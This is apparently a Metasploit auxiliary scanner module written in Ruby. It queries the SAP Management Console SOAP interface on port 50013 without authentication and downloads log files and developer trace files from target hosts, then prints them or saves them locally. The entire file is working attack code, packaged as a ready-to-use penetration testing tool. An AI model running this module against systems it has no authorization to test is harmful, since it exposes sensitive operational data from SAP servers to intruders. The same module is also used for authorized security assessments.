##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::HttpClient
	include Msf::Auxiliary::Report
	include Msf::Auxiliary::Scanner

	def initialize
		super(
			'Name'         => 'SAP Management Console Get Logfile',
			'Version'      => '$Revision$',
			'Description'  => %q{ This module simply attempts to download available logfiles and developer tracefiles through the SAP Management Console SOAP Interface. Please use the sap_manamgenet_console_listlogfiles extension to view a list of availble files. },
			'References'   =>
				[
					# General
					[ 'URL', 'http://blog.c22.cc' ]
				],
			'Author'       => [ 'Chris John Riley' ],
			'License'      => MSF_LICENSE
		)

		register_options(
			[
				Opt::RPORT(50013),
				OptString.new('URI', [false, 'Path to the SAP Management Console ', '/']),
				OptString.new('RFILE', [ true, "The name of the file to download", "sapstart.log"]),
				OptString.new('FILETYPE', [true, 'Specify LOGFILE or TRACEFILE', 'TRACEFILE']),
				OptString.new('UserAgent', [ true, "The HTTP User-Agent sent in the request",
				'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)' ]),
				OptString.new('LFILE', [false, 'Set path to save output to file', '']),
			], self.class)
		register_autofilter_ports([ 50013 ])
		deregister_options('RHOST')
	end

	def rport
		datastore['RPORT']
	end

	def run_host(ip)
		res = send_request_cgi({
			'uri'      => "/#{datastore['URI']}",
			'method'   => 'GET',
			'headers'  =>
				{
					'User-Agent' => datastore['UserAgent']
				}
		}, 25)
		return if not res

		gettfiles(ip)
	end

	def gettfiles(rhost)
		verbose = datastore['VERBOSE']
		print_status("[SAP] Connecting to SAP Management Console SOAP Interface on #{rhost}:#{rport}")
		success = false

		soapenv = 'http://schemas.xmlsoap.org/soap/envelope/'
		xsi = 'http://www.w3.org/2001/XMLSchema-instance'
		xs = 'http://www.w3.org/2001/XMLSchema'
		sapsess = 'http://www.sap.com/webas/630/soap/features/session/'

		case "#{datastore['FILETYPE']}"
		when /LOGFILE/i
			ns1 = 'ns1:ReadLogFile'
		when /TRACEFILE/i
			ns1 = 'ns1:ReadDeveloperTrace'
		end

		data = '<?xml version="1.0" encoding="utf-8"?>' + "\r\n"
		data << '<SOAP-ENV:Envelope xmlns:SOAP-ENV="' + soapenv + '"  xmlns:xsi="' + xsi + '" xmlns:xs="' + xs + '">' + "\r\n"
		data << '<SOAP-ENV:Header>' + "\r\n"
		data << '<sapsess:Session xlmns:sapsess="' + sapsess + '">' + "\r\n"
		data << '<enableSession>true</enableSession>' + "\r\n"
		data << '</sapsess:Session>' + "\r\n"
		data << '</SOAP-ENV:Header>' + "\r\n"
		data << '<SOAP-ENV:Body>' + "\r\n"
		data << '<' + ns1 + ' xmlns:ns1="urn:SAPControl"><filename>' + "#{datastore['RFILE']}" + '</filename></' + ns1 + '>' + "\r\n"
		data << '</SOAP-ENV:Body>' + "\r\n"
		data << '</SOAP-ENV:Envelope>' + "\r\n\r\n"
	
		begin
			res = send_request_raw({
				'uri'      => "/#{datastore['URI']}",
				'method'   => 'POST',
				'data'     => data,
				'headers'  =>
					{
						'Content-Length' => data.length,
						'SOAPAction'     => '""',
						'Content-Type'   => 'text/xml; charset=UTF-8',
					}
			}, 120)

			env = []

			if res.code == 200
				case res.body
				when nil
					# Nothing
				when /<item>([^<]+)<\/item>/i
					body = []
					body = res.body
					env = body.scan(/<item>([^<]+)<\/item>/i)
					success = true
				end

				case res.body
				when nil
					# Nothing
				when /<name>([^<]+)<\/name>/i
					name = "#{$1}"
					success = true
				end

			else res.code == 500
				case res.body
				when /<faultstring>(.*)<\/faultstring>/i
					faultcode = "#{$1}"
					fault = true
				end
			end

		rescue ::Rex::ConnectionError
			print_error("[SAP] Unable to attempt authentication")
			return
		end

		if success
			print_good("[SAP] #{datastore['FILETYPE']}: #{datastore['RFILE']} downloaded from #{rhost}:#{rport}")

			if datastore['LFILE'] != ''
				outputfile = datastore['LFILE'] + "_" + datastore['RHOST']
				print_status("Writing local file " + outputfile + " in XML format")
				File.open(outputfile,'ab') do |f|
					f << res.body
				end
			else
				env.each do |output|
					print_status("#{output}")
				end
				return
			end
		elsif fault
			print_error("[SAP] Errorcode: #{faultcode}")
			return
		else
			print_error("[SAP] failed to request environment")
			return
		end
	end
end
